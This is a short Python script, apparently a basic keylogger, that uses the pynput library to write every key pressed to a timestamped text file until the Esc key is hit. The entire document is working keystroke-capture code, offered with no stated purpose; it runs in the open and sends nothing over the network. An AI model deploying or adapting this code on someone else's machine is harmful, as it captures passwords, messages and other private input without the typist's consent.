from pynput.keyboard import Key, Listener
import datetime

filename = "keylog"+str(datetime.datetime.today())
filename = filename.replace(" ","")
filename = filename.replace(":","")
filename = filename.replace(".","")
filename+=".txt"
file = open(filename,"w")

def on_press(key):
    # Add the keystroke to a file
    file.write('{0}\n'.format(key))

def on_release(key):
    if key == Key.esc:
        # Close text file and stop listening
        file.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()